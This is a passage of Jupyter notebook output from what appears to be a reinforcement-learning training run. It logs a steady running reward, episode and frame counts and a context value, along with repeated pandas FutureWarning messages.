     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 331\t Frame count: 166100\t Context: 1\n",
      "Running reward: 11.00\t Episode 331\t Frame count: 166200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 331\t Frame count: 166300\t Context: 2\n",
      "Running reward: 11.00\t Episode 332\t Frame count: 166400\t Context: 2\n",
      "Running reward: 11.00\t Episode 332\t Frame count: 166500\t Context: 2\n",
      "Running reward: 11.00\t Episode 332\t Frame count: 166600\t Context: 2\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 166700\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 166800\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 166900\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 167000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 333\t Frame count: 167100\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 167200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 333\t Frame count: 167300\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 167400\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 167500\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 167600\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 167700\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 167800\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 167900\t Context: 1\n",
      "Running reward: 11.00\t Episode 333\t Frame count: 168000\t Context: 2\n",
      "Running reward: 11.00\t Episode 334\t Frame count: 168100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 334\t Frame count: 168200\t Context: 1\n",
      "Running reward: 11.00\t Episode 334\t Frame count: 168300\t Context: 1\n",
      "Running reward: 11.00\t Episode 334\t Frame count: 168400\t Context: 1\n",
      "Running reward: 11.00\t Episode 334\t Frame count: 168500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 335\t Frame count: 168600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 335\t Frame count: 168700\t Context: 1\n",
      "Running reward: 11.00\t Episode 335\t Frame count: 168800\t Context: 2\n",
      "Running reward: 11.00\t Episode 335\t Frame count: 168900\t Context: 2\n",
      "Running reward: 11.00\t Episode 335\t Frame count: 169000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 335\t Frame count: 169100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 336\t Frame count: 169200\t Context: 2\n",
      "Running reward: 11.00\t Episode 336\t Frame count: 169300\t Context: 2\n",
      "Running reward: 11.00\t Episode 336\t Frame count: 169400\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 169500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 337\t Frame count: 169600\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 169700\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 169800\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 169900\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 170000\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 170100\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 170200\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 170300\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 170400\t Context: 2\n",
      "Running reward: 11.00\t Episode 337\t Frame count: 170500\t Context: 2\n",
      "Running reward: 11.00\t Episode 338\t Frame count: 170600\t Context: 1\n",
      "Running reward: 11.00\t Episode 338\t Frame count: 170700\t Context: 1\n",
      "Running reward: 11.00\t Episode 338\t Frame count: 170800\t Context: 1\n",
      "Running reward: 11.00\t Episode 338\t Frame count: 170900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 338\t Frame count: 171000\t Context: 1\n",
      "Running reward: 11.00\t Episode 338\t Frame count: 171100\t Context: 2\n",
      "Running reward: 11.00\t Episode 338\t Frame count: 171200\t Context: 2\n",
      "Running reward: 11.00\t Episode 338\t Frame count: 171300\t Context: 2\n",
      "Running reward: 11.00\t Episode 339\t Frame count: 171400\t Context: 1\n",
      "Running reward: 11.00\t Episode 339\t Frame count: 171500\t Context: 1\n",
      "Running reward: 11.00\t Episode 339\t Frame count: 171600\t Context: 1\n",
      "Running reward: 11.00\t Episode 339\t Frame count: 171700\t Context: 2\n",
      "Running reward: 11.00\t Episode 340\t Frame count: 171800\t Context: 2\n",
      "Running reward: 11.00\t Episode 340\t Frame count: 171900\t Context: 2\n",
      "Running reward: 11.00\t Episode 340\t Frame count: 172000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 341\t Frame count: 172100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 341\t Frame count: 172200\t Context: 2\n",
      "Running reward: 11.00\t Episode 341\t Frame count: 172300\t Context: 2\n",
      "Running reward: 11.00\t Episode 341\t Frame count: 172400\t Context: 2\n",
      "Running reward: 11.00\t Episode 341\t Frame count: 172500\t Context: 2\n",
      "Running reward: 11.00\t Episode 341\t Frame count: 172600\t Context: 2\n",
      "Running reward: 11.00\t Episode 341\t Frame count: 172700\t Context: 2\n",
      "Running reward: 11.00\t Episode 341\t Frame count: 172800\t Context: 2\n",
      "Running reward: 11.00\t Episode 342\t Frame count: 172900\t Context: 1\n",
      "Running reward: 11.00\t Episode 342\t Frame count: 173000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 342\t Frame count: 173100\t Context: 2\n",
      "Running reward: 11.00\t Episode 342\t Frame count: 173200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 343\t Frame count: 173300\t Context: 1\n",
      "Running reward: 11.00\t Episode 343\t Frame count: 173400\t Context: 1\n",
      "Running reward: 11.00\t Episode 343\t Frame count: 173500\t Context: 2\n",
      "Running reward: 11.00\t Episode 343\t Frame count: 173600\t Context: 2\n",
      "Running reward: 11.00\t Episode 343\t Frame count: 173700\t Context: 2\n",
      "Running reward: 11.00\t Episode 343\t Frame count: 173800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 343\t Frame count: 173900\t Context: 2\n",
      "Running reward: 11.00\t Episode 343\t Frame count: 174000\t Context: 2\n",
      "Running reward: 11.00\t Episode 343\t Frame count: 174100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 344\t Frame count: 174200\t Context: 1\n",
      "Running reward: 11.00\t Episode 344\t Frame count: 174300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 344\t Frame count: 174400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 344\t Frame count: 174500\t Context: 1\n",
      "Running reward: 11.00\t Episode 344\t Frame count: 174600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 344\t Frame count: 174700\t Context: 2\n",
      "Running reward: 11.00\t Episode 345\t Frame count: 174800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 345\t Frame count: 174900\t Context: 1\n",
      "Running reward: 11.00\t Episode 346\t Frame count: 175000\t Context: 1\n",
      "Running reward: 11.00\t Episode 346\t Frame count: 175100\t Context: 1\n",
      "Running reward: 11.00\t Episode 346\t Frame count: 175200\t Context: 1\n",
      "Running reward: 11.00\t Episode 346\t Frame count: 175300\t Context: 1\n",
      "Running reward: 11.00\t Episode 346\t Frame count: 175400\t Context: 2\n",
      "Running reward: 11.00\t Episode 347\t Frame count: 175500\t Context: 1\n",
      "Running reward: 11.00\t Episode 347\t Frame count: 175600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 347\t Frame count: 175700\t Context: 1\n",
      "Running reward: 11.00\t Episode 347\t Frame count: 175800\t Context: 1\n",
      "Running reward: 11.00\t Episode 347\t Frame count: 175900\t Context: 1\n",
      "Running reward: 11.00\t Episode 347\t Frame count: 176000\t Context: 2\n",
      "Running reward: 11.00\t Episode 347\t Frame count: 176100\t Context: 2\n",
      "Running reward: 11.00\t Episode 348\t Frame count: 176200\t Context: 1\n",
      "Running reward: 11.00\t Episode 348\t Frame count: 176300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 348\t Frame count: 176400\t Context: 1\n",
      "Running reward: 11.00\t Episode 348\t Frame count: 176500\t Context: 2\n",
      "Running reward: 11.00\t Episode 348\t Frame count: 176600\t Context: 2\n",
      "Running reward: 11.00\t Episode 349\t Frame count: 176700\t Context: 1\n",
      "Running reward: 11.00\t Episode 349\t Frame count: 176800\t Context: 2\n",
      "Running reward: 11.00\t Episode 350\t Frame count: 176900\t Context: 1\n",
      "Running reward: 11.00\t Episode 350\t Frame count: 177000\t Context: 2\n",
      "Running reward: 11.00\t Episode 351\t Frame count: 177100\t Context: 1\n",
      "Running reward: 11.00\t Episode 351\t Frame count: 177200\t Context: 1\n",
      "Running reward: 11.00\t Episode 351\t Frame count: 177300\t Context: 1\n",
      "Running reward: 11.00\t Episode 351\t Frame count: 177400\t Context: 2\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 177500\t Context: 1\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 177600\t Context: 1\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 177700\t Context: 1\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 177800\t Context: 2\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 177900\t Context: 2\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 178000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 352\t Frame count: 178100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 352\t Frame count: 178200\t Context: 2\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 178300\t Context: 2\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 178400\t Context: 2\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 178500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 352\t Frame count: 178600\t Context: 2\n",
      "Running reward: 11.00\t Episode 352\t Frame count: 178700\t Context: 2\n",
      "Running reward: 11.00\t Episode 353\t Frame count: 178800\t Context: 2\n",
      "Running reward: 11.00\t Episode 354\t Frame count: 178900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 354\t Frame count: 179000\t Context: 1\n",
      "Running reward: 11.00\t Episode 354\t Frame count: 179100\t Context: 1\n",
      "Running reward: 11.00\t Episode 354\t Frame count: 179200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 354\t Frame count: 179300\t Context: 1\n",
      "Running reward: 11.00\t Episode 354\t Frame count: 179400\t Context: 2\n",
      "Running reward: 11.00\t Episode 354\t Frame count: 179500\t Context: 2\n",
      "Running reward: 11.00\t Episode 355\t Frame count: 179600\t Context: 1\n",
      "Running reward: 11.00\t Episode 355\t Frame count: 179700\t Context: 1\n",
      "Running reward: 11.00\t Episode 355\t Frame count: 179800\t Context: 2\n",
      "Running reward: 11.00\t Episode 355\t Frame count: 179900\t Context: 2\n",
      "Running reward: 11.00\t Episode 356\t Frame count: 180000\t Context: 1\n",
      "Running reward: 11.00\t Episode 356\t Frame count: 180100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 356\t Frame count: 180200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 356\t Frame count: 180300\t Context: 1\n",
      "Running reward: 11.00\t Episode 356\t Frame count: 180400\t Context: 1\n",
      "Running reward: 11.00\t Episode 356\t Frame count: 180500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 356\t Frame count: 180600\t Context: 1\n",
      "Running reward: 11.00\t Episode 356\t Frame count: 180700\t Context: 2\n",
      "Running reward: 11.00\t Episode 357\t Frame count: 180800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 357\t Frame count: 180900\t Context: 1\n",
      "Running reward: 11.00\t Episode 357\t Frame count: 181000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 357\t Frame count: 181100\t Context: 1\n",
      "Running reward: 11.00\t Episode 357\t Frame count: 181200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 358\t Frame count: 181300\t Context: 1\n",
      "Running reward: 11.00\t Episode 358\t Frame count: 181400\t Context: 1\n",
      "Running reward: 11.00\t Episode 358\t Frame count: 181500\t Context: 1\n",
      "Running reward: 11.00\t Episode 358\t Frame count: 181600\t Context: 1\n",
      "Running reward: 11.00\t Episode 358\t Frame count: 181700\t Context: 2\n",
      "Running reward: 11.00\t Episode 358\t Frame count: 181800\t Context: 2\n",
      "Running reward: 11.00\t Episode 358\t Frame count: 181900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 358\t Frame count: 182000\t Context: 2\n",
      "Running reward: 11.00\t Episode 358\t Frame count: 182100\t Context: 2\n",
      "Running reward: 11.00\t Episode 358\t Frame count: 182200\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 182300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 359\t Frame count: 182400\t Context: 1\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 182500\t Context: 1\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 182600\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 182700\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 182800\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 182900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 359\t Frame count: 183000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 359\t Frame count: 183100\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 183200\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 183300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 359\t Frame count: 183400\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 183500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 359\t Frame count: 183600\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 183700\t Context: 2\n",
      "Running reward: 11.00\t Episode 359\t Frame count: 183800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 360\t Frame count: 183900\t Context: 2\n",
      "Running reward: 11.00\t Episode 360\t Frame count: 184000\t Context: 2\n",
      "Running reward: 11.00\t Episode 361\t Frame count: 184100\t Context: 1\n",
      "Running reward: 11.00\t Episode 361\t Frame count: 184200\t Context: 2\n",
      "Running reward: 11.00\t Episode 361\t Frame count: 184300\t Context: 2\n",
      "Running reward: 11.00\t Episode 361\t Frame count: 184400\t Context: 2\n",
      "Running reward: 11.00\t Episode 362\t Frame count: 184500\t Context: 1\n",
      "Running reward: 11.00\t Episode 362\t Frame count: 184600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
